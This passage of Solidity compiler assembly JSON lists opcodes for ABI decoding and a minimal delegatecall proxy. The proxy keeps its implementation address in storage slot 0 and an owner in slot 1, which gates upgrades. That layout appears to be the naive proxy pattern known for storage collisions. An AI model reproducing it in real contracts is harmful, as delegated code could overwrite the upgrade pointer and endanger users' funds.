									"source": 1,
									"value": "25"
								},
								{
									"begin": 827,
									"end": 832,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "12"
								},
								{
									"begin": 800,
									"end": 833,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "tag",
									"source": 1,
									"value": "25"
								},
								{
									"begin": 800,
									"end": 833,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1352,
									"name": "tag",
									"source": 1,
									"value": "3"
								},
								{
									"begin": 845,
									"end": 1352,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 924,
									"end": 930,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 932,
									"end": 938,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 981,
									"end": 983,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 969,
									"end": 978,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 960,
									"end": 967,
									"name": "DUP6",
									"source": 1
								},
								{
									"begin": 956,
									"end": 979,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 952,
									"end": 984,
									"name": "SLT",
									"source": 1
								},
								{
									"begin": 949,
									"end": 1068,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 949,
									"end": 1068,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "27"
								},
								{
									"begin": 949,
									"end": 1068,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 987,
									"end": 1066,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "28"
								},
								{
									"begin": 987,
									"end": 1066,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "8"
								},
								{
									"begin": 987,
									"end": 1066,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 987,
									"end": 1066,
									"name": "tag",
									"source": 1,
									"value": "28"
								},
								{
									"begin": 987,
									"end": 1066,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 949,
									"end": 1068,
									"name": "tag",
									"source": 1,
									"value": "27"
								},
								{
									"begin": 949,
									"end": 1068,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1107,
									"end": 1108,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1132,
									"end": 1196,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "29"
								},
								{
									"begin": 1188,
									"end": 1195,
									"name": "DUP6",
									"source": 1
								},
								{
									"begin": 1179,
									"end": 1185,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 1168,
									"end": 1177,
									"name": "DUP7",
									"source": 1
								},
								{
									"begin": 1164,
									"end": 1186,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 1132,
									"end": 1196,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "13"
								},
								{
									"begin": 1132,
									"end": 1196,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1132,
									"end": 1196,
									"name": "tag",
									"source": 1,
									"value": "29"
								},
								{
									"begin": 1132,
									"end": 1196,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1122,
									"end": 1196,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 1122,
									"end": 1196,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1078,
									"end": 1206,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1245,
									"end": 1247,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 1271,
									"end": 1335,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "30"
								},
								{
									"begin": 1327,
									"end": 1334,
									"name": "DUP6",
									"source": 1
								},
								{
									"begin": 1318,
									"end": 1324,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 1307,
									"end": 1316,
									"name": "DUP7",
									"source": 1
								},
								{
									"begin": 1303,
									"end": 1325,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 1271,
									"end": 1335,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "13"
								},
								{
									"begin": 1271,
									"end": 1335,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1271,
									"end": 1335,
									"name": "tag",
									"source": 1,
									"value": "30"
								},
								{
									"begin": 1271,
									"end": 1335,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1261,
									"end": 1335,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 1261,
									"end": 1335,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1216,
									"end": 1345,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1352,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1352,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1352,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1352,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1352,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1352,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 141,
									"end": 1018,
									"name": "tag",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 141,
									"end": 1018,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 141,
									"end": 1018,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 141,
									"end": 1018,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 141,
									"end": 1018,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 141,
									"end": 1018,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 141,
									"end": 1018,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 141,
									"end": 1018,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 141,
									"end": 1018,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220a34ae33db78f9eebfec9ad10c82be4b74ab10a52c5040f7ca54dde6791ca1c5264736f6c634300081a0033",
									".code": [
										{
											"begin": 141,
											"end": 1018,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "PUSH",
											"source": 0,
											"value": "48EB76EE"
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "PUSH",
											"source": 0,
											"value": "795E617E"
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "PUSH",
											"source": 0,
											"value": "E062BB05"
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 141,
											"end": 1018,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 435,
											"end": 449,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 432,
											"end": 433,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 429,
											"end": 430,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 416,
											"end": 450,
											"name": "CALLDATACOPY",
											"source": 0
										},
										{
											"begin": 542,
											"end": 543,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 539,
											"end": 540,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 523,
											"end": 537,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 520,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 503,
											"end": 517,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 497,
											"end": 518,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 490,
											"end": 495,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 477,
											"end": 544,
											"name": "DELEGATECALL",
											"source": 0
										},
										{
											"begin": 578,
											"end": 594,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 575,
											"end": 576,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 572,
											"end": 573,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 557,
											"end": 595,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 615,
											"end": 621,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 639,
											"end": 640,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 634,
											"end": 700,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 634,
											"end": 700,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 634,
											"end": 700,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 634,
											"end": 700,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 749,
											"end": 765,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 746,
											"end": 747,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 739,
											"end": 766,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 634,
											"end": 700,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 634,
											"end": 700,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 669,
											"end": 685,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 666,
											"end": 667,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 659,
											"end": 686,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 207,
											"end": 230,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 207,
											"end": 230,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 207,
											"end": 230,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 207,
											"end": 230,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 207,
											"end": 230,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 207,
											"end": 230,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 207,
											"end": 230,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 207,
											"end": 230,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 207,
											"end": 230,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 207,
											"end": 230,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 207,
											"end": 230,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 207,
											"end": 230,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 802,
											"end": 981,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 802,
											"end": 981,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 802,
											"end": 981,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "tag",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 802,
											"end": 981,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 802,
											"end": 981,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 802,
											"end": 981,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 802,
											"end": 981,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 802,
											"end": 981,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 802,
											"end": 981,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 802,
											"end": 981,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 802,
											"end": 981,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 177,
											"end": 201,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 177,
											"end": 201,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 177,
											"end": 201,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 177,
											"end": 201,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 177,
											"end": 201,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 177,
											"end": 201,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 177,
											"end": 201,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 177,
											"end": 201,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 177,
											"end": 201,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 177,
											"end": 201,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "tag",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 177,
											"end": 201,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 177,
											"end": 201,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 207,
											"end": 230,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 207,
											"end": 230,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 207,
											"end": 230,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 207,
											"end": 230,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 207,
											"end": 230,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 207,
											"end": 230,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "tag",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 802,
											"end": 981,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 882,
											"end": 890,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 882,
											"end": 890,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 882,
											"end": 890,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 882,
											"end": 890,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 882,
											"end": 890,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 882,
											"end": 890,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 882,
											"end": 890,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 882,
											"end": 890,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 882,
											"end": 890,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 882,
											"end": 890,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 882,
											"end": 890,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 868,
											"end": 890,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 868,
											"end": 890,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 868,
											"end": 878,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 868,
											"end": 890,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 868,
											"end": 890,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 868,
											"end": 890,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 860,
											"end": 908,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 860,
											"end": 908,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 860,
											"end": 908,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 860,
											"end": 908,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 860,
											"end": 908,
											"name": "PUSH",
											"source": 0,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 860,
											"end": 908,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 860,
											"end": 908,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 860,
											"end": 908,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 860,
											"end": 908,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 860,
											"end": 908,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "28"
										},
										{
											"begin": 860,
											"end": 908,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 860,
											"end": 908,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "29"
										},
										{
											"begin": 860,
											"end": 908,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 860,
											"end": 908,
											"name": "tag",
											"source": 0,
											"value": "28"
										},
										{
											"begin": 860,
											"end": 908,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 860,
											"end": 908,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 860,
											"end": 908,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 860,
											"end": 908,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 860,
											"end": 908,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 860,
											"end": 908,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 860,
											"end": 908,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 860,
											"end": 908,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 860,
											"end": 908,
											"name": "tag",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 860,
											"end": 908,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 930,
											"end": 938,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 918,
											"end": 927,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 918,
											"end": 927,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 918,
											"end": 938,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 918,
											"end": 938,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 918,
											"end": 938,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 918,
											"end": 938,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 918,
											"end": 938,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 918,
											"end": 938,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 918,
											"end": 938,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 918,
											"end": 938,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 918,
											"end": 938,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 918,
											"end": 938,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 918,
											"end": 938,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 918,
											"end": 938,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 918,
											"end": 938,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 918,
											"end": 938,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 918,
											"end": 938,
											"name": "OR",
											"source": 0
										},
										{
											"begin": 918,
											"end": 938,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 918,
											"end": 938,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 918,
											"end": 938,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 802,
											"end": 981,
											"jumpType": "[out]",
